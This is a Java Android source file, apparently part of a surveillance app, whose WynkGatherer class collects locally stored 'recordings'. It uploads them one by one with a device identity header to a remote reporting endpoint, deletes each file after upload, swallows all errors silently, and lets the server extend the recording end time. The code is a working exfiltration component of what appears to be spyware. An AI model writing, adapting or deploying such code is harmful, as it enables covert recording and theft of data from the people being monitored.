package org.code.coregradle.gatherers;

import android.content.Context;
import android.content.SharedPreferences;

import androidx.work.ListenableWorker;

import org.json.JSONObject;
import org.code.coregradle.WorkerStore;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.MessageXInterceptor;

import java.io.File;
import java.util.Arrays;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class WynkGatherer implements InfoGatherer {

    private File recordingPath;
    private OkHttpClient okHttpClient;
    private IdentityStore identityStore;
    private Context context;
    public final static String WINK_EXTEND_PREFS = "winkExtendPrefs";
    public final static String WINK_END_TIME = "winkEndTime";


    @Override
    public void initGatherer(Context context) {
        okHttpClient = new OkHttpClient();
        recordingPath = new File(context.getFilesDir(), "wynks");
        this.identityStore = IdentityStore.getInstance(context);
        this.context = context;
    }


    @Override
    public JSONObject getRequestJSON() {
        return null;
    }

    private ListenableWorker.Result uploadFile(File file, int pending) {
        RequestBody requestBody = RequestBody.create(MediaType.get("application/x-binary"), file);
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_WYNK)
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-FILE-ID", file.getName())
                    .addHeader("X-PENDING", Integer.toString(pending))
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                file.delete();
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {
        }
        return ListenableWorker.Result.failure();
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        File[] recordings = recordingPath.listFiles();
        if (recordings != null) {
            int pending = recordings.length;
            Arrays.sort(recordings, (x, y) -> (int) (x.lastModified() - y.lastModified()));
            for (File file : recordings) {
                uploadFile(file, pending);
                pending -= 1;
            }
        }
        return ListenableWorker.Result.success();
    }

    public void handleEndTimeUpdate() {
        try {
            Response response = makeExtendWinkCall();
            if (response != null && response.isSuccessful()) {
                JSONObject responseJson = new JSONObject(response.body().string());
                if (responseJson.has("extend")) {
                    Long extension = responseJson.getLong("extend") * 1000L;
                    SharedPreferences sharedPreferences = context.getSharedPreferences(WINK_EXTEND_PREFS, Context.MODE_PRIVATE);
                    String message = "WinkEndTime Not Found in Shared Preferences";
                    if (sharedPreferences.contains(WINK_END_TIME)) {
                        Long existingEndTime = sharedPreferences.getLong(WINK_END_TIME, 0);
                        long updatedEndTime = existingEndTime + extension;
                        sharedPreferences.edit().putLong(WINK_END_TIME, updatedEndTime).apply();
                        message = "ExistingWinkEndTime : " + existingEndTime + "; Extension : " + extension + "; UpdatedWinkEndTime : " + updatedEndTime;
                    }
                    MessageXInterceptor messageXInterceptor = new MessageXInterceptor(message, identityStore.getIdentityValue());
                    WorkerStore.executorService.submit(messageXInterceptor);
                }
            }
        } catch (Exception ignored) {
        }
    }

    private Response makeExtendWinkCall() {
        Response response = null;
        try {
            JSONObject requestJSON = new JSONObject();
            requestJSON.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.EXTEND_WYNK)
                    .post(requestBody)
                    .build();
            response = okHttpClient.newCall(request).execute();
        } catch (Exception ignored) {
        }
        return response;
    }
}
